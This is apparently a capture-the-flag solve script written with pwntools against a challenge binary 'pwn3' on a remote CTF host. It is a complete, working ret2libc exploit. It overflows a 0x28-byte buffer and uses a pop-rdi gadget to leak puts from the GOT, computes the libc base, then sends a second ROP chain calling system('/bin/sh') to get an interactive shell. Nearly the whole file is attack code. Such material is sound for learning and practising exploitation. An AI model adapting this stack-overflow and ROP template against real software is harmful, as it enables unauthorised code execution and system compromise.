from pwn import *

binary = context.binary = ELF("./pwn3")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")

# puts GOT = 0x404018
puts_got = binary.got['puts']
# puts PLT = 0x401060
puts_plt = binary.plt['puts']
# puts in libc = 0x184ed0
puts_libc = libc.symbols['puts']
# main address = 0x4011db
main_addr  = binary.symbols['main']
# system address = 0x54ae0
system_off = libc.symbols['system']
# "/bin/sh" address = 0x1d8698
binsh_off  = 0x1d8698

rdi_gadget = 0x401232
ret_gadget = 0x401233

if args.REMOTE:
    p = remote('challs.n00bzunit3d.xyz', 42450)
elif args.GDB:
    p = gdb.debug(binary.path, env={"LD_PRELOAD":libc.path})
else:
    p = process(binary.path, env={"LD_PRELOAD":libc.path})

payload = b""
payload += b"A" * 0x28

payload += p64(rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)

p.readline()
p.readline()
tmp = p.readline()[:-1]
puts_found = u64(tmp + b"\x00" * (8 - len(tmp)))
libc_base = puts_found - puts_libc

system_addr   = libc_base + system_off
binsh_addr    = libc_base + binsh_off

payload = b""
payload += b"A" * 0x28
payload += p64(rdi_gadget)
payload += p64(binsh_addr)
payload += p64(ret_gadget)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()